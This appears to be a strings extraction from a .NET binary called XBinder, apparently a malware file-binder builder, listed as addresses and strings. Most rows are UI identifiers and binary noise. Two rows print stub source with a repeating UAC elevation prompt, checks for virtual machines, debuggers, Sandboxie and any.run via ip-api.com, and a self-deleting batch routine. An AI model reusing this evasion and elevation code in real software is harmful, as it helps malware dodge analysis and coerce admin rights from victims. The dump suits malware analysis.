reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40ef64	0x40efcf	string	0x40a696	Flush
0x40efe0	0x40f04a	string	0x40a696	Randomi
0x40efe5	0x40f03b	string	0x40a696	set_ColorDepth
0x40efe9	0x40f03b	string	0x40a696	set_ColorDepth
0x40eff1	0x40f052	string	0x40a696	Timer1_Tick
0x40eff8	0x40f06a	string	0x40a696	add_Tick
0x40f1c0	0x40f234	string	0x40a696	AddToolStripMenuItem_Click
0x40f1e8	0x40f24f	string	0x40a696	UserprofileToolStripMenuItem_Click
0x40f518	0x40f58c	string	0x40a696	set_REGToolStripMenuItem
0x40f525	0x40f58c	string	0x40a696	set_REGToolStripMenuItem
0x40f53e	0x40f5a5	string	0x40a696	get_ProgramDataToolStripMenuItem
0x40f62b	0x40f69d	string	0x40a696	get_AddToolStripMenuItem
0x40f6fc	0x40f770	string	0x40a696	set_AllusersprofileToolStripMenuItem
0x40f757	0x40f7cb	string	0x40a696	get_TrueToolStripMenuItem
0x40f859	0x40f8c9	string	0x40a696	set_HiddenToolStripMenuItem
0x40f87b	0x40f8e5	string	0x40a696	get_WDExclusionToolStripMenuItem
0x40facd	0x40fb41	string	0x40a696	Random
0x40fae1	0x40fb48	string	0x40a696	set_MainForm
0x40fc96	0x40fd01	string	0x40a696	ControlCollection
0x40fc9d	0x40fd13	string	0x40a696	ListViewSubItemCollection
0x40fdab	0x40fe21	string	0x40a696	get_FileDescription
0x40fefc	0x40ff72	string	0x40a696	FormatNumber
0x40ff0f	0x40ff11	string	0x40a696	Lv1_DragDrop
0x40ff1c	0x40ff1e	string	0x40a696	add_DragDrop
0x40ff29	0x40ff2b	string	0x40a696	remove_DragDrop
0x40ff39	0x40ff3b	string	0x40a696	set_AllowDrop
0x40ff47	0x40ff49	string	0x40a696	set_TabStop
0x40ff5c	0x40ff5e	string	0x40a696	Char
0x410073	0x4100da	string	0x40a696	LinkLabelLinkClickedEventHandler
0x41014c	0x4101b3	string	0x40a696	ResourceWriter
0x41018c	0x41018e	string	0x40a696	get_User
0x410195	0x410197	string	0x40a696	XPelsPerMeter
0x4101a3	0x4101a5	string	0x40a696	YPelsPerMeter
0x4101b1	0x4101b3	string	0x40a696	ResourceWriter
0x4101c0	0x4101c2	string	0x40a696	BinaryWriter
0x4101e6	0x4101e8	string	0x40a696	add_DragEnter
0x4101f4	0x4101f6	string	0x40a696	remove_DragEnter
0x410205	0x410207	string	0x40a696	clsListviewSorter
0x410224	0x410226	string	0x40a696	ServerComputer
0x410233	0x410235	string	0x40a696	MyComputer
0x41023e	0x410240	string	0x40a696	iconDir
0x41026a	0x41026c	string	0x40a696	set_ForeColor
0x410272	0x4102d9	string	0x40a696	SetProjectError
0x410278	0x41027a	string	0x40a696	set_BackColor
0x410286	0x410288	string	0x40a696	set_UseVisualStyleBackColor
0x41028d	0x4102f4	string	0x40a696	ToolStripSeparator
0x4102a2	0x4102a4	string	0x40a696	set_LinkColor
0x4102a6	0x410307	string	0x40a696	IEnumerator
0x4102b0	0x4102b2	string	0x40a696	set_TransparentColor
0x4102c5	0x4102c7	string	0x40a696	ClearProjectError
0x4102d7	0x4102d9	string	0x40a696	SetProjectError
0x4102e7	0x4102e9	string	0x40a696	set_Cursor
0x4102f2	0x4102f4	string	0x40a696	ToolStripSeparator
0x410305	0x410307	string	0x40a696	IEnumerator
0x410311	0x410313	string	0x40a696	GetEnumerator
0x41031f	0x410321	string	0x40a696	Activator
0x410329	0x41032b	string	0x40a696	.ctor
0x410336	0x410338	string	0x40a696	IconInjector
0x410359	0x41035b	string	0x40a696	CreateEncryptor
0x410369	0x41036b	string	0x40a696	StructureToPtr
0x41046b	0x4104d6	string	0x40a696	deleteExistingResources
0x4104df	0x410555	string	0x40a696	set_EnableVisualStyles
0x41052f	0x410531	string	0x40a696	get_Images
0x410553	0x410555	string	0x40a696	set_EnableVisualStyles
0x410613	0x410615	string	0x40a696	DragEventArgs
0x410621	0x410623	string	0x40a696	ColumnClickEventArgs
0x410636	0x410638	string	0x40a696	KeyEventArgs
0x410643	0x410645	string	0x40a696	get_LegalTrademarks
0x410657	0x410659	string	0x40a696	ReferenceEquals
0x410667	0x410669	string	0x40a696	Utils
0x41066d	0x41066f	string	0x40a696	get_Controls
0x410676	0x4106ea	string	0x40a696	AutoResizeColumns
0x41067a	0x41067c	string	0x40a696	get_Items
0x410684	0x410686	string	0x40a696	get_SubItems
0x410691	0x410693	string	0x40a696	get_SelectedItems
0x4106a3	0x4106a5	string	0x40a696	get_DropDownItems
0x4106b5	0x4106b7	string	0x40a696	System.Windows.Forms
0x4106ca	0x4106cc	string	0x40a696	get_Forms
0x4106d4	0x4106d6	string	0x40a696	MyForms
0x4106dc	0x4106de	string	0x40a696	get_Columns
0x4106e8	0x4106ea	string	0x40a696	AutoResizeColumns
0x4106fa	0x4106fc	string	0x40a696	set_AutoScaleDimensions
0x410712	0x410714	string	0x40a696	Conversions
0x410722	0x410798	string	0x40a696	WaitForPendingFinalizers
0x410731	0x410733	string	0x40a696	set_CompilerOptions
0x4107d8	0x41084d	string	0x40a696	ImageFormat
0x4107e1	0x4107e3	string	0x40a696	get_Cross
0x4107e8	0x410859	string	0x40a696	set_Effect
0x410844	0x410846	string	0x40a696	Concat
0x410857	0x410859	string	0x40a696	set_Effect
0x410859	0x4108c0	string	0x40a696	MyProject
0x410867	0x4108ca	string	0x40a696	set_FullRowSelect
0x4108cf	0x41093d	string	0x40a696	EndInit
0x4108e1	0x41094f	string	0x40a696	GraphicsUnit
0x410916	0x410918	string	0x40a696	get_Height
0x410962	0x4109c9	string	0x40a696	MsgBoxResult
0x410973	0x410975	string	0x40a696	set_SaveMySettingsOnExit
0x41098c	0x41098e	string	0x40a696	get_Default
0x410998	0x41099a	string	0x40a696	SetCompatibleTextRenderingDefault
0x4109a0	0x410a03	string	0x40a696	Resources_Parent
0x4109ba	0x4109bc	string	0x40a696	DialogResult
0x4109c7	0x4109c9	string	0x40a696	MsgBoxResult
0x4109d4	0x4109d6	string	0x40a696	ClrImportant
0x4109e1	0x4109e3	string	0x40a696	Environment
0x4109e7	0x410a58	string	0x40a696	get_ImageCount
0x4109ed	0x4109ef	string	0x40a696	InitializeComponent
0x410a01	0x410a03	string	0x40a696	Resources_Parent
0x410a07	0x410a7b	string	0x40a696	set_OverwritePrompt
0x410a12	0x410a14	string	0x40a696	get_Transparent
0x410a22	0x410a24	string	0x40a696	get_Current
0x410a2e	0x410a30	string	0x40a696	GetDataPresent
0x410a3a	0x410aa1	string	0x40a696	get_FilePrivatePart
0x410a3d	0x410a3f	string	0x40a696	Point
0x410a4c	0x410a4e	string	0x40a696	get_Count
0x410a56	0x410a58	string	0x40a696	get_ImageCount
0x410a65	0x410a67	string	0x40a696	ColorCount
0x410a70	0x410a72	string	0x40a696	BitCount
0x410a80	0x410ae7	string	0x40a696	set_ImageList
0x410b18	0x410b8f	string	0x40a696	Show
0x410b1e	0x410b8f	string	0x40a696	Show
0x410b35	0x410b37	string	0x40a696	output
0x410b3c	0x410b3e	string	0x40a696	MoveNext
0x410b67	0x410bc8	string	0x40a696	index
0x410b96	0x410b98	string	0x40a696	get_Index
0x410bd7	0x410bd9	string	0x40a696	PictureBox
0x410be2	0x410be4	string	0x40a696	MsgBox
0x410be9	0x410beb	string	0x40a696	CheckBox
0x410bf2	0x410bf4	string	0x40a696	ComboBox
0x410bfb	0x410bfd	string	0x40a696	GroupBox
0x410c04	0x410c06	string	0x40a696	InputBox
0x410c0d	0x410c0f	string	0x40a696	XBinder.My
0x410c18	0x410c1a	string	0x40a696	ToArray
0x410c20	0x410c22	string	0x40a696	set_Key
0x410c5e	0x410c60	string	0x40a696	get_Assembly
0x410c72	0x410ce8	string	0x40a696	keyy
0x410c9d	0x410c9f	string	0x40a696	iconEntry
0x410cd4	0x410d4a	string	0x40a696	Icon-0
0x410cd6	0x410cd8	string	0x40a696	FileSystemProxy
0x413ad6	0x413b43	string	0x40a696	\bTabPage1
0x413bfa	0x413c61	string	0x40a696	RunningToolStripMenuItem
0x413df1	0x413e65	string	0x40a696	WinDirToolStripMenuItem
0x413e0e	0x413e82	string	0x40a696	System32ToolStripMenuItem
0x41401a	0x41408e	string	0x40a696	REGToolStripMenuItem
0x4140f1	0x414165	string	0x40a696	\tComboBox1
0x41410c	0x414180	string	0x40a696	\tGroupBox2
0x414188	0x4141bc	string	0x40a696	\tCheckBox3
0x4143ab	0x41441c	string	0x40a696	Dispose__Instance__
0x414413	0x414489	string	0x40a696	\vMy.Settings
0x414cc1	0x414d24	string	0x40a696	width
0x414f30	0x414f05	string	0x40a696	$\eiwn
0x415c2e	0x415c6d	string	0x40a696	tRG1
0x42e646	0x42e5d4	string	0x40a696	sIDATx^
0x42f358	0x42f392	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x42f481	0x42f483	string	0x40a696	pUo)q
0x42f846	0x42f8c7	string	0x40a696	I78S,
0x42f85a	0x42f8a8	string	0x40a696	I78S,
0x4301e6	0x430174	string	0x40a696	sIDATx^
0x430ef8	0x430f32	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x431021	0x431023	string	0x40a696	pUo)q
0x4313e6	0x431467	string	0x40a696	I78S,
0x4313fa	0x431448	string	0x40a696	I78S,
0x431d86	0x431d14	string	0x40a696	sIDATx^
0x432a98	0x432ad2	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x432bc1	0x432bc3	string	0x40a696	pUo)q
0x432f86	0x433007	string	0x40a696	I78S,
0x432f9a	0x432fe8	string	0x40a696	I78S,
0x433926	0x4338b4	string	0x40a696	sIDATx^
0x434638	0x434672	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x434761	0x434763	string	0x40a696	pUo)q
0x434b26	0x434ba7	string	0x40a696	I78S,
0x434b3a	0x434b88	string	0x40a696	I78S,
0x435eaa	0x435ead	string	0x40a696	<OBt
0x4367f6	0x43685f	string	0x40a696	B\rZY
0x43742d	0x437450	string	0x40a696	t[s\a
0x43771d	0x437724	string	0x40a696	$@"j
0x438a32	0x438a64	string	0x40a696	øF?\v blocks=Latin-1 Supplement,Basic Latin
0x439981	0x4399f8	string	0x40a696	MSFt
0x43a79e	0x43a72c	string	0x40a696	sIDATx^
0x43b4b0	0x43b4ea	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x43b5d9	0x43b5db	string	0x40a696	pUo)q
0x43b99e	0x43ba1f	string	0x40a696	I78S,
0x43b9b2	0x43ba00	string	0x40a696	I78S,
0x43c33e	0x43c2cc	string	0x40a696	sIDATx^
0x43d050	0x43d08a	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x43d179	0x43d17b	string	0x40a696	pUo)q
0x43d53e	0x43d5bf	string	0x40a696	I78S,
0x43d552	0x43d5a0	string	0x40a696	I78S,
0x43dede	0x43de6c	string	0x40a696	sIDATx^
0x43ebf0	0x43ec2a	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x43ed19	0x43ed1b	string	0x40a696	pUo)q
0x43f0de	0x43f15f	string	0x40a696	I78S,
0x43f0f2	0x43f140	string	0x40a696	I78S,
0x43fa7e	0x43fa0c	string	0x40a696	sIDATx^
0x440790	0x4407ca	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x4408b9	0x4408bb	string	0x40a696	pUo)q
0x440c7e	0x440cff	string	0x40a696	I78S,
0x440c92	0x440ce0	string	0x40a696	I78S,
0x44161e	0x4415ac	string	0x40a696	sIDATx^
0x442330	0x44236a	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x442459	0x44245b	string	0x40a696	pUo)q
0x44281e	0x44289f	string	0x40a696	I78S,
0x442832	0x442880	string	0x40a696	I78S,
0x443ba2	0x443ba5	string	0x40a696	<OBt
0x4444ee	0x444557	string	0x40a696	B\rZY
0x445125	0x445148	string	0x40a696	t[s\a
0x445415	0x44541c	string	0x40a696	$@"j
0x44672a	0x44675c	string	0x40a696	øF?\v blocks=Latin-1 Supplement,Basic Latin
0x4481a4	0x4481a7	string	0x40a696	<OBt
0x448af0	0x448b59	string	0x40a696	B\rZY
0x449727	0x44974a	string	0x40a696	t[s\a
0x449a17	0x449a1e	string	0x40a696	$@"j
0x44ad2c	0x44ad5e	string	0x40a696	øF?\v blocks=Latin-1 Supplement,Basic Latin
0x44bdc2	0x44bd50	string	0x40a696	sIDATx^
0x44cad4	0x44cb0e	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x44cbfd	0x44cbff	string	0x40a696	pUo)q
0x44cfc2	0x44d043	string	0x40a696	I78S,
0x44cfd6	0x44d024	string	0x40a696	I78S,
0x44d962	0x44d8f0	string	0x40a696	sIDATx^
0x44e674	0x44e6ae	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x44e79d	0x44e79f	string	0x40a696	pUo)q
0x44eb62	0x44ebe3	string	0x40a696	I78S,
0x44eb76	0x44ebc4	string	0x40a696	I78S,
0x44f502	0x44f490	string	0x40a696	sIDATx^
0x450214	0x45024e	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x45033d	0x45033f	string	0x40a696	pUo)q
0x450702	0x450783	string	0x40a696	I78S,
0x450716	0x450764	string	0x40a696	I78S,
0x4510a2	0x451030	string	0x40a696	sIDATx^
0x451db4	0x451dee	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x451edd	0x451edf	string	0x40a696	pUo)q
0x4522a2	0x452323	string	0x40a696	I78S,
0x4522b6	0x452304	string	0x40a696	I78S,
0x452c42	0x452bd0	string	0x40a696	sIDATx^
0x453954	0x45398e	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x453a7d	0x453a7f	string	0x40a696	pUo)q
0x453e42	0x453ec3	string	0x40a696	I78S,
0x453e56	0x453ea4	string	0x40a696	I78S,
0x4551c6	0x4551c9	string	0x40a696	<OBt
0x455b12	0x455b7b	string	0x40a696	B\rZY
0x456749	0x45676c	string	0x40a696	t[s\a
0x456a39	0x456a40	string	0x40a696	$@"j
0x457d4e	0x457d80	string	0x40a696	øF?\v blocks=Latin-1 Supplement,Basic Latin
0x458d28	0x458d8f	string	0x40a696	\v8oM\f
0x4597c1	0x459770	string	0x40a696	k~x\a
0x459dfb	0x459e52	string	0x40a696	w,0J
0x45ac94	0x45ac69	string	0x40a696	\a);L
0x45c46e	0x45c49c	string	0x40a696	M[zD}M
0x45c5d0	0x45c5c8	string	0x40a696	`8s*oc}
0x45c7da	0x45c7b3	string	0x40a696	h5^}F
0x45c8da	0x45c873	string	0x40a696	33+/
0x45cc1b	0x45cc86	string	0x40a696	IDATx^
0x45e0e0	0x45e09e	string	0x40a696	Qǣ\bu( blocks=Basic Latin,Latin Extended-B
0x45edf0	0x45ee5f	string	0x40a696	Fc,~
0x45eebc	0x45ee5f	string	0x40a696	Fc,~
0x45ef32	0x45eed2	string	0x40a696	b\t|-
0x45f483	0x45f4ec	string	0x40a696	{C`}
0x45f8ba	0x45f848	string	0x40a696	sIDATx^
0x4605cc	0x460606	string	0x40a696	đb9R blocks=Latin Extended-A,Basic Latin
0x4606f5	0x4606f7	string	0x40a696	pUo)q
0x460aba	0x460b3b	string	0x40a696	I78S,
0x460ace	0x460b1c	string	0x40a696	I78S,
0x461398	0x4613ec	string	0x40a696	\b!\r"ԥٔ blocks=Basic Latin,Cyrillic Supplement,Arabic
0x46182c	0x4617e7	string	0x40a696	?ۿÿ˿ blocks=Basic Latin,Arabic,Latin-1 Supplement,Spacing Modifier Letters
0x461a76	0x461ada	string	0x40a696	$]LC
0x461aa3	0x461a69	string	0x40a696	"o{\e
0x461d5c	0x461d70	string	0x40a696	.-DT
0x461e50	0x461ec3	string	0x40a696	eu!"
0x462637	0x462613	string	0x40a696	]74m
0x463643	0x46367b	string	0x40a696	\b*&N
0x4638b3	0x4638de	string	0x40a696	^\aJt;J
0x4638bd	0x46391f	string	0x40a696	t>xF
0x4638fa	0x4638de	string	0x40a696	^\aJt;J
0x46397d	0x463989	string	0x40a696	~~)|
0x4642c4	0x4642c7	string	0x40a696	!DDT
0x464aae	0x464ae2	string	0x40a696	Tl^~
0x466e77	0x466e7d	string	0x40a696	ւ'i] blocks=Armenian,Basic Latin
0x467e72	0x467e94	string	0x40a696	er.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)\r\n If Key.GetValue("ShowSuperHidden") = 1 Then\r\n Key.SetValue("ShowSuperHidden", 0)\r\n End If\r\n Catch ex As Exception\r\n Debug.WriteLine(ex.Message)\r\n End Try\r\n#End If\r\n\r\n#If METHOD0 = False And METHOD1 = False And METHOD2 = False And METHOD3 = False Then\r\n WorkF()\r\n#End If\r\n\r\n#If METHOD0 Then\r\n If Not AdminCheck() Then\r\n\r\n Try\r\n Dim StartInfo As New ProcessStartInfo\r\n StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName\r\n StartInfo.Verb = "runas"\r\n StartInfo.UseShellExecute = True\r\n Process.Start(StartInfo) : Environment.Exit(Environment.ExitCode)\r\n Catch ex As Exception\r\n Environment.Exit(Environment.ExitCode)\r\n End Try\r\n Else\r\n WorkF()\r\n End If\r\n#End If\r\n\r\n\r\n\r\n#If METHOD1 Then\r\n If Not AdminCheck() Then\r\n\r\n Try\r\nRUAC:\r\n Dim StartInfo As New ProcessStartInfo\r\n StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName\r\n StartInfo.Verb = "runas"\r\n StartInfo.UseShellExecute = True\r\n Process.Start(StartInfo) : Environment.Exit(Environment.ExitCode)\r\n Catch ex As Exception\r\n GoTo RUAC\r\n End Try\r\n Else\r\n WorkF()\r\n End If\r\n#End If\r\n\r\n\r\n#If METHOD2 Then\r\n If Not AdminCheck() Then\r\n bypassR()\r\n Else\r\n WorkF()\r\n End If \r\n#End If\r\n\r\n#If METHOD3 Then\r\n If Not AdminCheck() Then\r\n Execute()\r\n Else\r\n WorkF()\r\n End If\r\n#End If\r\n\r\n End Sub\r\n Public Shared Function WorkF(Optional Code = Nothing)\r\n For Each Code In Li
0x46b381	0x46b3ab	string	0x40a696	er.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then\r\n Return True\r\n End If\r\n Next\r\n End Using\r\n End Using\r\n Return False\r\n End Function\r\n Public Shared Function DetectDebugger() As Boolean\r\n Dim isDebuggerPresent As Boolean = False\r\n CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, isDebuggerPresent)\r\n Return isDebuggerPresent\r\n End Function\r\n Public Shared Function DetectSandboxie() As Boolean\r\n If GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then\r\n Return True\r\n Else\r\n Return False\r\n End If\r\n End Function\r\n Public Shared Function anyrun() As Boolean\r\n Try\r\n Dim status As String = New System.Net.WebClient().DownloadString("http://ip-api.com/line/?fields=hosting")\r\n Return status.Contains("true")\r\n Catch\r\n End Try\r\n Return False\r\n End Function\r\n <DllImport("kernel32.dll")>Public Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr\r\n End Function\r\n <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)>Public Shared Function CheckRemoteDebuggerPresent(ByVal hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean\r\n End Function\r\n#End If\r\n\r\n#If METHOD0 Or METHOD1 Or METHOD2 Or METHOD3 Then\r\n Public Shared Function AdminCheck() As Boolean\r\n Try\r\n Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)\r\n Catch ex As Exception\r\n Debug.WriteLine(ex.Message)\r\n End Try\r\n End Function\r\n#End If\r\n\r\n#If Del Then\r\n Public Shared Function DRun()\r\n Try\r\n Dim batch As String = Path.GetTempFileName() & ".bat"\r\n Using sw As StreamWriter = New StreamWriter(batch)\r\n sw.WriteLine("@echo off")
0x46cc54	0x46ccbb	string	0x40a696	QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
0x46e2a1	0x46e28a	string	0x40a696	vm3q
0x46e427	0x46e47e	string	0x40a696	;\eJǌ blocks=Basic Latin,Latin Extended-B
0x46e82e	0x46e7f0	string	0x40a696	dB8-
0x47022c	0x470242	string	0x40a696	ƍ35j blocks=Latin Extended-B,Basic Latin
0x47133c	0x47131d	string	0x40a696	m(݄p blocks=Basic Latin,Syriac
0x471616	0x4715b5	string	0x40a696	cǎiC\a blocks=Basic Latin,Latin Extended-B
0x47182d	0x471871	string	0x40a696	)|@0E
0x471e68	0x471e6e	string	0x40a696	`ڶm[iI blocks=Basic Latin,Arabic
0x472f84	0x472f60	string	0x40a696	Z\v\bC
0x4734f6	0x473532	string	0x40a696	>[IC0
0x47380b	0x473796	string	0x40a696	yguO
0x473aa4	0x473a9e	string	0x40a696	KrS}
0x473d98	0x473d93	string	0x40a696	\r\e64_~
0x474e8a	0x474e76	string	0x40a696	4a\aӏ? blocks=Basic Latin,Cyrillic
0x475519	0x475511	string	0x40a696	aѢEjݨ blocks=Basic Latin,Cyrillic,Arabic Supplement
0x476eb1	0x476e3d	string	0x40a696	fժUr blocks=Basic Latin,Armenian
0x477197	0x477143	string	0x40a696	Lg̘a blocks=Basic Latin,Combining Diacritical Marks
0x47732d	0x4772dd	string	0x40a696	ᇦjժjm blocks=Hangul Jamo,Basic Latin,Armenian
